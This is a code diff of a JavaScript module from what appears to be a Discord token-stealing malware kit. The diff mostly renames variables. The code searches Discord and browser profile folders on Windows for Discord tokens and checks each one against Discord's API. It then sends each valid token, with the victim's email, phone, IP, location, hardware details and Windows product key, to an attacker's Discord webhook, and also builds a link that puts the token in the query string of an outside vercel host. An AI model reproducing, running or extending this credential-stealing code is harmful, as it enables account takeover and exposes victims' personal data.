@@ -1,69 +1,70 @@
 const { getInfo } = require("./../../modules/core/core");
 const { fetchServers, fetchFriends, getEmbeds, send } = require("./../../utils/functions");
 const { WebhookClient } = require("discord.js");
-const { totalsTokens, find } = require("./find");
+const { ALL_TOKENS, FIND_TOKENS } = require("./find");
 const DiscordToken = require("discord.js-token");
-const getconfig = require("./../../config/config")();
 const process = require("process");
 const axios = require("axios");
 
+const GET_CONFIG = require("./../../config/config")();
+
 const webhook = new WebhookClient({
-    url: getconfig.webhook,
+    url: GET_CONFIG.webhook,
 });
 
-const appData = process.env.appdata;
-const localAppData = process.env.localappdata;
+const APPDATA = process.env.appdata;
+const LOCAL_APPDATA = process.env.localappdata;
 
 let paths = [
-    `${appData}/discord/`,
-    `${appData}/discordcanary/`,
-    `${appData}/discordptb/`,
-    `${appData}/discorddevelopment/`,
-    `${appData}/lightcord/`,
-    `${appData}/Opera Software/Opera Stable/`,
-    `${appData}/Opera Software/Opera GX Stable/`,
-    `${localAppData}/Google/Chrome/User Data/Default/`,
-    `${localAppData}/Google/Chrome/User Data/Profile 1/`,
-    `${localAppData}/Google/Chrome/User Data/Profile 2/`,
-    `${localAppData}/Google/Chrome/User Data/Profile 3/`,
-    `${localAppData}/Google/Chrome/User Data/Profile 4/`,
-    `${localAppData}/Google/Chrome/User Data/Profile 5/`,
-    `${localAppData}/Google/Chrome/User Data/Guest Profile/`,
-    `${localAppData}/Google/Chrome/User Data/Default/Network/`,
-    `${localAppData}/Google/Chrome/User Data/Profile 1/Network/`,
-    `${localAppData}/Google/Chrome/User Data/Profile 2/Network/`,
-    `${localAppData}/Google/Chrome/User Data/Profile 3/Network/`,
-    `${localAppData}/Google/Chrome/User Data/Profile 4/Network/`,
-    `${localAppData}/Google/Chrome/User Data/Profile 5/Network/`,
-    `${localAppData}/Google/Chrome/User Data/Guest Profile/Network/`,
-    `${localAppData}/Microsoft/Edge/User Data/Default/`,
-    `${localAppData}/Microsoft/Edge/User Data/Profile 1/`,
-    `${localAppData}/Microsoft/Edge/User Data/Profile 2/`,
-    `${localAppData}/Microsoft/Edge/User Data/Profile 3/`,
-    `${localAppData}/Microsoft/Edge/User Data/Profile 4/`,
-    `${localAppData}/Microsoft/Edge/User Data/Profile 5/`,
-    `${localAppData}/Microsoft/Edge/User Data/Guest Profile/`,
-    `${localAppData}/Microsoft/Edge/User Data/Default/Network/`,
-    `${localAppData}/Microsoft/Edge/User Data/Profile 1/Network/`,
-    `${localAppData}/Microsoft/Edge/User Data/Profile 2/Network/`,
-    `${localAppData}/Microsoft/Edge/User Data/Profile 3/Network/`,
-    `${localAppData}/Microsoft/Edge/User Data/Profile 4/Network/`,
-    `${localAppData}/Microsoft/Edge/User Data/Profile 5/Network/`,
-    `${localAppData}/Microsoft/Edge/User Data/Guest Profile/Network/`,
+    `${APPDATA}/discord/`,
+    `${APPDATA}/discordcanary/`,
+    `${APPDATA}/discordptb/`,
+    `${APPDATA}/discorddevelopment/`,
+    `${APPDATA}/lightcord/`,
+    `${APPDATA}/Opera Software/Opera Stable/`,
+    `${APPDATA}/Opera Software/Opera GX Stable/`,
+    `${LOCAL_APPDATA}/Google/Chrome/User Data/Default/`,
+    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 1/`,
+    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 2/`,
+    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 3/`,
+    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 4/`,
+    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 5/`,
+    `${LOCAL_APPDATA}/Google/Chrome/User Data/Guest Profile/`,
+    `${LOCAL_APPDATA}/Google/Chrome/User Data/Default/Network/`,
+    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 1/Network/`,
+    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 2/Network/`,
+    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 3/Network/`,
+    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 4/Network/`,
+    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 5/Network/`,
+    `${LOCAL_APPDATA}/Google/Chrome/User Data/Guest Profile/Network/`,
+    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Default/`,
+    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 1/`,
+    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 2/`,
+    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 3/`,
+    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 4/`,
+    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 5/`,
+    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Guest Profile/`,
+    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Default/Network/`,
+    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 1/Network/`,
+    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 2/Network/`,
+    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 3/Network/`,
+    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 4/Network/`,
+    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 5/Network/`,
+    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Guest Profile/Network/`,
 ];
 
-async function sendTokens() {
+async function SEND_INFOS() {
     for (let path of paths) {
-        await find(path);
+        await FIND_TOKENS(path);
     }
-    for (let token of totalsTokens) {
+    for (let TOKEN of ALL_TOKENS) {
         try {
             let k4itrun;
             try {
                 const _ = await axios.get("https://discord.com/api/v9/users/@me", {
                     headers: {
                         "Content-Type": "application/json",
-                        Authorization: token
+                        Authorization: TOKEN
                     }
                 });
                 k4itrun = _.data;
@@ -73,11 +74,11 @@ async function sendTokens() {
 
             if (!k4itrun) continue;
 
-            var copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
-            var servers =  fetchServers(token);
-            var friends =  fetchFriends(token);
+            var copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${TOKEN}`;
+            var servers =  fetchServers(TOKEN);
+            var friends =  fetchFriends(TOKEN);
             let system = await getInfo();
-            var discord = new DiscordToken(token, system.ip).info;
+            var discord = new DiscordToken(TOKEN, system.IP).info;
 
             webhook.send(send(getEmbeds({
                 author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
@@ -86,7 +87,7 @@ async function sendTokens() {
                 fields: [
                     { name: "<a:aura:1087044506542674091> Token:", value: "```" + discord.token + "```" + `\n[[Click Here To Copy Your Token]](${copy})` },
                     { name: "<a:aura:1101739920319590420> Nitro:", value: "" + discord.nitroType + "", inline: true },
-                    { name: "<a:aura:995172580988309664> IP Adress", value: "`" + system.ip + "`", inline: true },
+                    { name: "<a:aura:995172580988309664> IP Adress", value: "`" + system.IP + "`", inline: true },
                     { name: "<a:aura:863691953531125820> Phone", value: "`" + discord.phone + "`", inline: true },
                     { name: "<:aura:974711605927505990> Email", value: "`" + discord.mail + "`", inline: true },
                     { name: "Badges", value: "" + discord.badges + "", inline: true },
@@ -141,19 +142,19 @@ async function sendTokens() {
                     {
                         name: "System",
                         value: "```yml" +
-                            "\nCPU: " + system.cpu +
-                            "\nUUID: " + system.uid +
-                            "\nRAM: " + system.ram +
+                            "\nCPU: " + system.CPU +
+                            "\nUUID: " + system.UID +
+                            "\nRAM: " + system.RAM +
                             "\nMac Address: " + "Not found" +
-                            "\nProduct Key: " + system.windowskey +
+                            "\nProduct Key: " + system.WINDOWS_KEY +
                             "\nLOCAL IP: " + "Not found" +
-                            "\nOS Version: " + system.windowsversion + "```",
+                            "\nOS Version: " + system.WINDOWS_VERSION + "```",
                         inline: false
                     },
                     {
                         name: "Network",
                         value: "```yml" +
-                            "\nPUBLIC: " + system.ip +
+                            "\nPUBLIC: " + system.IP +
                             "\nCountry: " + discord.IP.country +
                             "\nRegion: " + discord.IP.region +
                             "\nCity: " + discord.IP.city +
@@ -174,5 +175,5 @@ async function sendTokens() {
 }
 
 module.exports = {
-    sendTokens
+    sendTokens: SEND_INFOS
 }
